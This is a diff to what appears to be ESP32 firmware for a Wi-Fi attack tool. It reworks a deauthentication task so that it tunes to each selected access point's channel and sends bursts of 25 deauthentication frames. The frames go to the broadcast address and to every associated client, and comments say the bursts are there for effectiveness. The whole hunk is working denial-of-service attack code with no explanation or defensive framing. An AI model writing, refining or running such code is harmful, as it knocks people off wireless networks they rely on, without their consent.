@@ -230,32 +230,29 @@ static void deauth_task(void *param) {
     
     while (1) {
         if (selected_ap_count_local > 0 && selected_aps_local != NULL) {
-            for (size_t ch_idx = 0; ch_idx < wireshark_channels_count; ch_idx++) {
-                int ch = wireshark_channels[ch_idx];
-                bool channel_set = false;
-                for (int sel_idx = 0; sel_idx < selected_ap_count_local; sel_idx++) {
-                    for (int i = 0; i < ap_count; i++) {
-                        if (memcmp(ap_info[i].bssid, selected_aps_local[sel_idx].bssid, 6) == 0 && ap_info[i].primary == ch) {
-                        if (!channel_set) {
-                            wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
-                            esp_wifi_set_channel(ch, sec);
-                            channel_set = true;
+            // Iterate through selected APs directly instead of all channels
+            // This ensures each selected AP gets proper time on its channel
+            for (int sel_idx = 0; sel_idx < selected_ap_count_local; sel_idx++) {
+                for (int i = 0; i < ap_count; i++) {
+                    if (memcmp(ap_info[i].bssid, selected_aps_local[sel_idx].bssid, 6) == 0) {
+                        int ch = ap_info[i].primary;
+                        wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
+                        esp_wifi_set_channel(ch, sec);
+                        
+                        // Burst loop for effectiveness
+                        for (int burst = 0; burst < 25; burst++) {
+                            deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
                         }
-                            // Burst loop for effectiveness
-                            for (int burst = 0; burst < 25; burst++) {
-                                deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
-                            }
-                            for (int j = 0; j < station_count; j++) {
-                                if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
-                                    for (int burst = 0; burst < 25; burst++) {
-                                        deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
-                                    }
+                        for (int j = 0; j < station_count; j++) {
+                            if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
+                                for (int burst = 0; burst < 25; burst++) {
+                                    deauth_attack_broadcast(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
                                 }
                             }
                         }
+                        vTaskDelay(pdMS_TO_TICKS(5));
                     }
                 }
-                if (channel_set) vTaskDelay(pdMS_TO_TICKS(5));
             }
         } else if (strlen((const char *)selected_ap_local.ssid) > 0) {
             for (int i = 0; i < ap_count; i++) {
